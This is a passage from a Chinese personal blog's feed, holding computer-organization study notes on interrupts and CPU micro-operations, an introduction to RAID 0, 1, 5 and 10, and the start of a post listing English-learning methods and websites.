D;&#x65AD;&#x89E6;&#x53D1;&#x5668; EINT = 1</p><p>&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684; &#x65F6;&#x95F4;&#xFF1A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x5468;&#x671F;&#x7ED3;&#x675F;&#x65F6;&#x523B;&#x7531;CPU&#x53D1;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7;</p><p>&#x4E2D;&#x65AD;&#x9690;&#x6307;&#x4EE4;</p><p>1.&#x4FDD;&#x62A4;&#x7A0B;&#x5E8F;&#x65AD;&#x70B9;</p><p>2.&#x5BFB;&#x627E;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x5730;&#x5740;</p><p>3.&#x786C;&#x4EF6; &#x5173;&#x4E2D;&#x65AD;</p><p>&#x4FDD;&#x62A4;&#x73B0;&#x573A;&#x548C;&#x6062;&#x590D;&#x73B0;&#x573A;</p><p>&#x7A0B;&#x5E8F;&#x65AD;&#x70B9;&#x4FDD;&#x62A4;&#x548C;&#x4FDD;&#x62A4;CPU&#x5185;&#x90E8;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x5185;&#x5BB9;</p><p>&#x4E2D;&#x65AD;&#x5C4F;&#x853D;&#x6280;&#x672F;</p><p>1.&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x6982;&#x5FF5;</p><p>2.&#x5B9E;&#x73B0;&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;</p><p>1).&#x63D0;&#x524D;&#x8BBE;&#x7F6E;&#x201C;&#x5F00;&#x4E2D;&#x65AD;&#x201D;&#x6307;&#x4EE4;</p><p>2).&#x4F18;&#x5148;&#x7EA7;&#x522B;&#x9AD8;&#x7684;&#x4E2D;&#x65AD;&#x6E90;&#x6709;&#x6743;&#x4E2D;&#x65AD;&#x4F18;&#x5148;&#x7EA7;&#x522B;&#x4F4E;&#x7684;&#x4E2D;&#x65AD;&#x6E90;</p><p>3.&#x5C4F;&#x853D;&#x6280;&#x672F;</p><p>1).&#x5C4F;&#x853D;&#x89E6;&#x53D1;&#x5668;&#x548C;&#x5C4F;&#x853D;&#x5B57;</p><p>2).&#x5C4F;&#x853D;&#x6280;&#x672F;&#x53EF;&#x6539;&#x53D8;&#x4F18;&#x5148;&#x7B49;&#x7EA7;</p><p>3).&#x5C4F;&#x853D;&#x6280;&#x672F;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528;</p><p>4.&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x65AD;&#x70B9;&#x4FDD;&#x62A4;</p><p>&#x4E5D;  &#x63A7;&#x5236;&#x5355;&#x5143;&#x529F;&#x80FD;</p><p>&#x53D6;&#x503C;&#x5468;&#x671F;</p><p>PC-&gt;MAR</p><p>1-&gt;R</p><p>M(MAR)-&gt;MDR</p><p>MDR-&gt;IR</p><p>OP(IR)-&gt;CU</p><p>(PC)+1-&gt;PC</p><p>&#x95F4;&#x5740;&#x5468;&#x671F;</p><p>Ad(IR)-&gt;MAR</p><p>1-&gt;R</p><p>M(MAR)-&gt;MDR</p><p>MDR-&gt;Ad(IR)</p><p>&#x6267;&#x884C;&#x5468;&#x671F;</p><table><thead><tr><th>&#x6307;&#x4EE4;&#x7C7B;&#x522B;</th><th>&#x6B65;&#x9AA4;</th></tr></thead><tbody><tr><td>&#x975E;&#x8BBF;&#x5B58;&#x6307;&#x4EE4;</td><td>0-&gt;ACC&#x3001;ACC&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;ACC&#xAF;-&gt;ACC&#x3001;L(ACC)-&gt;R(ACC),ACC0ACC0-&gt;ACC0ACC0&#x3001;R(ACC)-&gt;L(ACC),ACC0ACC0-&gt;ACC0ACC0&#x3001;0-&gt;G</td></tr><tr><td>&#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x52A0;&#x6CD5;&#x6307;&#x4EE4;</td><td>ADD X&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;R&#x3001;M(MAR)-&gt;MDR&#x3001;(ACC)+(MDR)-&gt;ACC</td></tr><tr><td>&#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x5B58;&#x6570;&#x6307;&#x4EE4;</td><td>STA X&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;W&#x3001;ACC-&gt;MDR&#x3001;MDR-&gt;M(MAR)</td></tr><tr><td>&#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x53D6;&#x6570;&#x6307;&#x4EE4;</td><td>LDA x&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;R&#x3001;M(MAR)-&gt;MDR&#x3001;MDR-ACC</td></tr><tr><td>&#x8F6C;&#x79FB;&#x6307;&#x4EE4;-&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;</td><td>JMP x&#x3001;Ad(IR)-&gt;PC</td></tr><tr><td>&#x8F6C;&#x79FB;&#x6307;&#x4EE4;-&#x6761;&#x4EF6;&#x8F6C;&#x79FB;</td><td>BAN X(&#x8D1F;&#x5219;&#x8F6C;)&#x3001;A0&#x2217;Ad(IR)+A0&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;(PC)&#x2212;&gt;PCA0&#x2217;Ad(IR)+A0&#xAF;(PC)&#x2212;&gt;PC</td></tr></tbody></table><p>&#x4E2D;&#x65AD;&#x5468;&#x671F;</p><p>0-&gt;MAR</p><p>1-&gt;W</p><p>PC-&gt;MDR</p><p>MDR-&gt;M(MAR)</p><p>&#x4E2D;&#x65AD;&#x7A0B;&#x5E8F;&#x8BC6;&#x522B;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x5730;&#x5740;M-&gt;PC</p><p>0-&gt;EINT</p><p>&#x63A7;&#x5236;&#x65B9;&#x5F0F;</p><table><thead><tr><th>&#x63A7;&#x5236;&#x65B9;&#x5F0F;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x540C;&#x6B65;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x4EFB;&#x4E00;&#x5FAE;&#x64CD;&#x4F5C;&#x5747;&#x7531;&#x7EDF;&#x4E00;&#x57FA;&#x51C6;&#x65F6;&#x6807;&#x7684;&#x65F6;&#x5E8F;&#x4FE1;&#x53F7;&#x63A7;&#x5236;</td></tr><tr><td>&#x5F02;&#x6B65;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x65E0;&#x57FA;&#x51C6;&#x65F6;&#x6807;&#x4FE1;&#x53F7;&#x3001;&#x65E0;&#x56FA;&#x5B9A;&#x7684;&#x5468;&#x671F;&#x8282;&#x62CD;&#x548C;&#x4E25;&#x683C;&#x7684;&#x65F6;&#x949F;&#x540C;&#x6B65;&#x3001;&#x91C7;&#x7528; &#x5E94;&#x7B54;&#x65B9;&#x5F0F;</td></tr><tr><td>&#x8054;&#x5408;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x540C;&#x6B65;&#x4E0E;&#x5F02;&#x6B65;&#x76F8;&#x7ED3;&#x5408;</td></tr><tr><td>&#x4EBA;&#x5DE5;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>Reset&#x3001;&#x8FDE;&#x7EED;&#x548C;&#x5355;&#x6761;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8F6C;&#x6362;&#x5F00;&#x5173;&#x3001;&#x7B26;&#x5408;&#x505C;&#x673A;&#x5F00;&#x5173;</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;2.14，去**的情人节，还是电脑好玩&lt;/p&gt;
&lt;p&gt;我吐了，组成原理真是大学最痛苦的课程之一，太难了o(╥﹏╥)o&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机组成&lt;/p&gt;
&lt;p&gt;一  计算机系统概论&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RAID磁盘阵列技术介绍</title>
    <link href="https://marnm.github.io//posts/fa8e89f7/"/>
    <id>https://marnm.github.io//posts/fa8e89f7/</id>
    <published>2018-08-31T08:33:36.000Z</published>
    <updated>2020-04-09T11:50:11.084Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h3><p>RAID&#xFF08;&#x72EC;&#x7ACB;&#x5197;&#x4F59;&#x78C1;&#x76D8;&#x9635;&#x5217;&#xFF09;&#x6280;&#x672F;&#x662F;&#x901A;&#x8FC7;&#x628A;&#x591A;&#x4E2A;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7EC4;&#x5408;&#x6210;&#x4E00;&#x4E2A;&#x5BB9;&#x91CF;&#x5927;&#x3001;&#x5B89;&#x5168;&#x6027;&#x66F4;&#x597D;&#x7684;&#x78C1;&#x76D8;&#x9635;&#x5217;&#xFF0C;&#x5E76;&#x628A;&#x6570;&#x5207;&#x5272;&#x6210;&#x591A;&#x4E2A;&#x5206;&#x533A;&#x6BB5;&#x540E;&#x5206;&#x522B;&#x5B58;&#x653E;&#x5728;&#x5404;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E0A;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x5206;&#x6563;&#x8BFB;&#x5199;&#x6280;&#x672F;&#x6765;&#x63D0;&#x5347;&#x78C1;&#x76D8;&#x9635;&#x5217;&#x6574;&#x4F53;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x540C;&#x4E8B;&#x5427;&#x591A;&#x4E2A;&#x91CD;&#x8981;&#x6570;&#x636E;&#x7684;&#x526F;&#x672C;&#x540C;&#x6B65;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x8BBE;&#x5907;&#x4E0A;&#x3002;<br><a id="more"></a><br>RAID&#x6280;&#x672F;&#x5177;&#x6709;&#x975E;&#x5E38;&#x597D;&#x7684;&#x6570;&#x636E;&#x5197;&#x4F59;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5B83;&#x4E5F;&#x76F8;&#x5E94;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x6210;&#x672C;&#x652F;&#x51FA;&#x3002;</p><p>&#x76EE;&#x524D;&#x5DF2;&#x6709;&#x7684;RAID&#x78C1;&#x76D8;&#x9635;&#x5217;&#x65B9;&#x6848;&#x81F3;&#x5C11;&#x6709;&#x5341;&#x51E0;&#x79CD;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x6709;RAID0&#x3001;RAID1&#x3001;RAI5&#x548C;RAID10&#x8FD9;&#x51E0;&#x79CD;&#x3002;</p><h3 id="RAID-0"><a href="#RAID-0" class="headerlink" title="RAID 0"></a>RAID 0</h3><p>RAID0&#x662F;&#x628A;&#x591A;&#x5757;&#x7269;&#x7406;&#x786C;&#x76D8;&#xFF08;&#x81F3;&#x5C11;&#x4E24;&#x5757;&#xFF09;&#x901A;&#x8FC7;&#x786C;&#x4EF6;&#x6216;&#x8F6F;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#x4E32;&#x8054;&#x5728;&#x4E00;&#x8D77;&#xFF0C;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5377;&#x7EC4;&#xFF0C;&#x5E76;&#x5C06;&#x6570;&#x636E;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x5230;&#x5404;&#x4E2A;&#x7269;&#x7406;&#x786C;&#x76D8;&#x4E2D;&#x3002;RAID0&#x80FD;&#x591F;&#x6709;&#x6548;&#x7684;&#x63D0;&#x5347;&#x786C;&#x76D8;&#x6570;&#x636E;&#x7684;&#x541E;&#x5410;&#x901F;&#x5EA6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5177;&#x5907;&#x6570;&#x636E;&#x4FEE;&#x590D;&#x548C;&#x9519;&#x8BEF;&#x4FEE;&#x590D;&#x7684;&#x80FD;&#x529B;&#x3002;</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/RAID_0.svg/150px-RAID_0.svg.png" alt="RAID0 &#x6280;&#x672F;&#x793A;&#x610F;&#x56FE;"></p><h3 id="RAID-1"><a href="#RAID-1" class="headerlink" title="RAID 1"></a>RAID 1</h3><p>RAID1&#x5B83;&#x662F;&#x628A;&#x4E24;&#x5757;&#x4EE5;&#x4E0A;&#x7684;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A;&#xFF0C;&#x5728;&#x5199;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x540C;&#x65F6;&#x5199;&#x5165;&#x5230;&#x591A;&#x5757;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E0A;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x89C6;&#x4E3A;&#x6570;&#x636E;&#x7684;&#x955C;&#x50CF;&#x6216;&#x5907;&#x4EFD;&#xFF09;&#x3002;&#x4F46;&#x5176;&#x4E2D;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x53D1;&#x751F;&#x6545;&#x969C;&#x540E;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x7ACB;&#x5373;&#x81EA;&#x52A8;&#x4EE5;&#x70ED;&#x5907;&#x4EFD;&#x4EA4;&#x6362;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x6062;&#x590D;&#x6570;&#x636E;&#x7684;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002;</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Raid1.png/184px-Raid1.png" alt="RAID1"></p><p>RAID1&#x6CE8;&#x91CD;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5229;&#x7528;&#x7387;&#x4F4E;&#xFF0C;&#x800C;&#x4E14;&#xFF0C;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x628A;&#x6570;&#x636E;&#x540C;&#x65F6;&#x5199;&#x5165;&#x5230;&#x4E24;&#x5757;&#x4EE5;&#x4E0A;&#x7684;&#x786C;&#x76D8;&#x52A0;&#x4E0A;&#xFF0C;&#x8FD9;&#x65E0;&#x7591;&#x4E5F;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x589E;&#x52A0;&#x4E86;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x8D1F;&#x8F7D;</p><h3 id="RAID-5"><a href="#RAID-5" class="headerlink" title="RAID 5"></a>RAID 5</h3><p>RAID 5&#x6280;&#x672F;&#x5728;&#x7406;&#x8BBA;&#x4E0A;&#x517C;&#x987E;&#x4E86;&#x4E09;&#x8005;&#xFF08;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x3001;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#x3001;&#x6210;&#x672C;&#xFF09;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x66F4;&#x50CF;&#x662F;&#x5BF9;&#x8FD9;&#x4E09;&#x8005;&#x7684;&#x201C;&#x76F8;&#x4E92;&#x59A5;&#x534F;&#x201D;&#x3002;</p><p>RAID5&#x662F;&#x628A;&#x786C;&#x76D8;&#x7684;&#x6570;&#x636E;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#x4FDD;&#x5B58;&#x5230;&#x5176;&#x4ED6;&#x786C;&#x76D8;&#x4E2D;&#x3002;RAID5&#x78C1;&#x76D8;&#x9635;&#x5217;&#x7EC4;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#x5E76;&#x4E0D;&#x662F;&#x5355;&#x72EC;&#x4FDD;&#x5B58;&#x5230;&#x67D0;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5B58;&#x50A8;&#x5230;&#x9664;&#x81EA;&#x8EAB;&#x4EE5;&#x5916;&#x7684;&#x5176;&#x4ED6;&#x6BCF;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x597D;&#x5904;&#x662F;&#x5176;&#x4E2D;&#x4EFB;&#x4F55;&#x4E00;&#x5757;&#x8BBE;&#x5907;&#x635F;&#x574F;&#x540E;&#x4E0D;&#x81F3;&#x4E8E;&#x51FA;&#x73B0;&#x81F4;&#x547D;&#x7F3A;&#x9677;<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/RAID_5.svg/640px-RAID_5.svg.png" alt="RAID 5"></p><p>&#x56FE;&#x4E2D;<code>Ap</code> ~ <code>Dp</code>&#x90E8;&#x5206;&#x5B58;&#x653E;&#x7684;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;</p><h3 id="RAID-10"><a href="#RAID-10" class="headerlink" title="RAID 10"></a>RAID 10</h3><p>&#x9274;&#x4E8E;RAID5&#x6280;&#x672F;&#x662F;&#x56E0;&#x4E3A;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x6210;&#x672C;&#x95EE;&#x9898;&#x8BFB;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x548C;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#x80FD;&#x6709;&#x4E86;&#x4E00;&#x5B9A;&#x7684;&#x59A5;&#x534F;&#xFF0C;&#x4F46;&#x662F;&#x5927;&#x90E8;&#x5206;&#x4F01;&#x4E1A;&#x66F4;&#x5728;&#x4E4E;&#x7684;&#x662F;&#x6570;&#x636E;&#x672C;&#x8EAB;&#x7684;&#x4EF7;&#x503C;&#x800C;&#x975E;&#x786C;&#x76D8;&#x4EF7;&#x683C;&#xFF0C;&#x56E0;&#x6B64;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5E38;&#x7528;RAID10&#x6280;&#x672F;&#x3002;</p><p>RAID 10&#x662F;RAID 1+RAID 0&#x6280;&#x672F;&#x7684;&#x4E00;&#x4E2A;&#x7EC4;&#x5408;&#x4F53;&#x3002;</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bb/RAID_10.svg/220px-RAID_10.svg.png" alt="RAID 10"></p><p>&#x7EC4;&#x5EFA;RAID 10&#x81F3;&#x5C11;&#x9700;&#x8981;4&#x5757;&#x786C;&#x76D8;&#xFF0C;&#x5176;&#x4E2D;&#x5148;&#x5206;&#x522B;&#x5236;&#x4F5C;&#x4E00;&#x5BF9;RAID 1&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF1B;&#x7136;&#x540E;&#x518D;&#x4F7F;&#x7528;&#x4E00;&#x5BF9;RAID 0&#x521B;&#x5EFA;RAID 0&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x9AD8;&#x8BBE;&#x5907;&#x7684;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x3002;</p><p>&#x7406;&#x8BBA;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;&#x53EA;&#x8981;&#x574F;&#x7684;&#x4E0D;&#x662F;&#x540C;&#x4E00;&#x7EC4;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x786C;&#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x6700;&#x591A;&#x53EF;&#x4EE5;&#x635F;&#x574F;50%&#x7684;&#x8BBE;&#x5907;&#x800C;&#x4E0D;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3002;&#x7531;&#x4E8E;RAID 10&#x7EE7;&#x627F;&#x4E86;RAID 0&#x7684;&#x9AD8;&#x901F;&#x8BFB;&#x5199;&#x548C;RAID 1&#x7684;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5728;&#x4E0D;&#x8003;&#x8651;&#x6210;&#x672C;&#x7684;&#x60C5;&#x51B5;&#x4E0B;RAID 10&#x7684;&#x6027;&#x80FD;&#x90FD;&#x8D85;&#x8FC7;&#x4E86;RAID 5&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      RAID(独立冗余磁盘阵列)技术介绍
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="磁盘阵列" scheme="https://marnm.github.io/tags/%E7%A3%81%E7%9B%98%E9%98%B5%E5%88%97/"/>
    
      <category term="RAID 0" scheme="https://marnm.github.io/tags/RAID-0/"/>
    
      <category term="RAID 1" scheme="https://marnm.github.io/tags/RAID-1/"/>
    
      <category term="RAID 5" scheme="https://marnm.github.io/tags/RAID-5/"/>
    
      <category term="RAID 10" scheme="https://marnm.github.io/tags/RAID-10/"/>
    
  </entry>
  
  <entry>
    <title>我学练英语所使用的方法、工具与资料</title>
    <link href="https://marnm.github.io//posts/9bf5b5/"/>
    <id>https://marnm.github.io//posts/9bf5b5/</id>
    <published>2018-08-23T15:55:04.000Z</published>
    <updated>2018-10-03T17:35:40.222Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://dramatea.github.io/077%20%E6%88%91%E5%AD%A6%E7%BB%83%E8%8B%B1%E8%AF%AD%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%96%99.html" target="_blank" rel="noopener">&#x539F;&#x6587;&#xFF1A;dramatea</a></p></blockquote><p><strong>&#x8BD5;&#x7528;&#x8FC7;&#x7684;&#x65B9;&#x6CD5;&#xFF08;&#x6309;&#x8FDB;&#x5C55;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#xFF09;</strong><br>&#x521D;&#x4E2D;&#x9AD8;&#x4E2D;&#x5927;&#x5B66;&#x7684;&#x82F1;&#x8BED;&#x8BFE;&#x5802;&#x4E0E;&#x8003;&#x8BD5;<br>&#x3010;&#x4E0D;&#x5F97;&#x4E0D;&#x627F;&#x8BA4;&#x6211;&#x90A3;&#x53EF;&#x601C;&#x7684;&#x8BED;&#x6CD5;&#x77E5;&#x8BC6;&#x548C;&#x5927;&#x591A;&#x6570;&#x5355;&#x8BCD;&#x90FD;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x638C;&#x63E1;&#x7684;<br><a id="more"></a><br>&#x4F7F;&#x7528;&#x80CC;&#x5355;&#x8BCD;&#x5DE5;&#x5177;&#xFF0C;&#x6309;&#x7167;&#x8BB0;&#x5FC6;&#x66F2;&#x7EBF;&#x6BCF;&#x65E5;&#x6B7B;&#x8BB0;&#x786C;&#x80CC;&#x65B0;&#x8BCD;&#x6216;&#x590D;&#x4E60;&#x65E7;&#x8BCD;<br>&#xFF08;&#x6247;&#x8D1D;&#x6253;&#x5361;&#x8BB0;&#x5F55;&#xFF1A;<a href="http://www.shanbay.com/checkin/user/920425/" target="_blank" rel="noopener">http://www.shanbay.com/checkin/user/920425/</a><br>&#x3010;&#x5BF9;&#x4E8E;&#x6211;&#x8FD9;&#x79CD;&#x8BB0;&#x6027;&#x5DEE;&#x7684;&#x4EBA;&#x6B64;&#x6CD5;&#x6548;&#x679C;&#x5F88;&#x4E00;&#x822C;&#x3002;&#x575A;&#x6301;&#x6253;&#x5361;370&#x5929;&#x540E;&#x505C;&#x6B62;&#x4F7F;&#x7528;&#x6247;&#x8D1D;&#x3002;&#x4F46;&#x6362;&#x4E86;&#x4E2A;&#x767E;&#x8BCD;&#x65A9;&#x5076;&#x5C14;&#x518D;&#x80CC;&#x80CC;&#x5355;&#x8BCD;<br>&#x5976;&#x7238;&#x82F1;&#x8BED;&#x6559;&#x5BA4;&#x4E2D;&#x7EA7; <a href="http://t.cn/zjSMhMC" target="_blank" rel="noopener">http://t.cn/zjSMhMC</a><br>easy VOA <a href="http://www.easyvoa.com/" target="_blank" rel="noopener">http://www.easyvoa.com/</a> &#xFF08;&#x7F8E;&#x56FD;&#x4E4B;&#x97F3;&#xFF0C;&#x6D4B;&#x8BD5;&#x81EA;&#x5DF1;&#x662F;&#x5426;&#x542C;&#x61C2;&#xFF0C;&#x5224;&#x65AD;&#x7EA7;&#x522B;<br>&#xFF08;&#x8BFB;&#x8BB0;&#x2014;&#x2014;&#x6076;&#x9B54;&#x5976;&#x7238;&#x7684;&#x82F1;&#x8BED;&#x5B66;&#x4E60;&#x65B9;&#x6CD5; <a href="http://dramatea.com/a/397" target="_blank" rel="noopener">http://dramatea.com/a/397</a><br>&#x3010;&#x5B8C;&#x6210;&#x4E86;&#x7B2C;&#x4E00;&#x6B65;&#x9AA4;&#xFF0C;&#x53D1;&#x97F3;&#x7684;&#x7EA0;&#x6B63;&#x3002;&#x540E;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x60C5;&#x51B5;&#x8C03;&#x6574;&#x540E;&#x7EED;&#x65B9;&#x6CD5;<br>&#x5728;&#x5E94;&#x7528;&#x4E2D;&#x7EC3;&#x4E60;&#xFF08;&#x7EC3;&#x82F1;&#x8BED;&#x957F;&#x77E5;&#x8BC6;&#x4E24;&#x4E0D;&#x8BEF;<br>&#x2460;&#x76F4;&#x63A5;&#x53BB;&#x9605;&#x8BFB;&#x82F1;&#x6587;&#x7684;&#x6587;&#x7AE0;&#x548C;&#x4E66;&#x7C4D;&#xFF0C;&#x4E0D;&#x8BA4;&#x8BC6;&#x7684;&#x5355;&#x8BCD;&#x67E5;&#x8BCD;&#x5178;&#xFF1B;<br>&#x2461;&#x91CD;&#x590D;&#x770B;/&#x542C;&#x82F1;&#x8BED;&#x89C6;&#x9891;&#xFF08;&#x5E26;&#x4E2D;&#x82F1;&#x5B57;&#x5E55;&#xFF09;&#xFF1B;<br>&#xFF08;&#x9700;&#x8981;&#x53D1;&#x97F3;&#x3001;&#x8BCD;&#x6C47;&#x91CF;&#x3001;&#x8BED;&#x6CD5;&#x6709;&#x90A3;&#x4E48;&#x70B9;&#x57FA;&#x7840;<br>&#x3010;&#x4E2D;&#x9636;ing&#x2026;</p><p><strong>&#x53D1;&#x97F3;</strong><br>&#x7EC3;&#x4E60;&#x97F3;&#x6807;&#x53D1;&#x97F3;&#x7684;&#x6559;&#x7A0B;&#x89C6;&#x9891;&#x548C;flash&#x4EC0;&#x4E48;&#x7684;&#xFF08;&#x597D;&#x65E9;&#x524D;&#x7528;&#x8FC7;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x4E86;<br>&#x8D56;&#x4E16;&#x96C4;&#x7F8E;&#x8BED;&#x97F3;&#x6807; <a href="http://t.cn/zRtwZA7" target="_blank" rel="noopener">http://t.cn/zRtwZA7</a> &#xFF08;&#x8DDF;&#x7740;&#x8D56;&#x8001;&#x5E08;&#x7684;&#x8BFE;&#x7A0B;&#x7EC3;&#x4E60;&#x53D1;&#x97F3;&#x5C31;&#x597D;</p><p><strong>&#x8BCD;&#x6C47;</strong><br>Test Your Vocab <a href="http://testyourvocab.com&#xFF08;&#x8BCD;&#x6C47;&#x91CF;&#x6D4B;&#x8BD5;" target="_blank" rel="noopener">http://testyourvocab.com&#xFF08;&#x8BCD;&#x6C47;&#x91CF;&#x6D4B;&#x8BD5;</a><br>&#x6D77;&#x8BCD; <a href="http://dict.cn/&#xFF08;&#x8BCD;&#x5178;&#xFF0C;&#x5E38;&#x7528;&#xFF0C;&#x6C49;&#x2192;&#x82F1;&#xFF0C;&#x82F1;&#x2192;&#x6C49;" target="_blank" rel="noopener">http://dict.cn/&#xFF08;&#x8BCD;&#x5178;&#xFF0C;&#x5E38;&#x7528;&#xFF0C;&#x6C49;&#x2192;&#x82F1;&#xFF0C;&#x82F1;&#x2192;&#x6C49;</a><br>&#x6247;&#x8D1D;&#x7F51; <a href="http://shanbay.com" target="_blank" rel="noopener">http://shanbay.com</a> &#xFF08;&#x80CC;&#x5355;&#x8BCD;/&#x9605;&#x8BFB;/&#x5C0F;&#x7EC4;&#x5185;&#x4E92;&#x76F8;&#x6FC0;&#x52B1;<br>&#x767E;&#x8BCD;&#x65A9; <a href="http://www.baicizhan.com" target="_blank" rel="noopener">http://www.baicizhan.com</a> 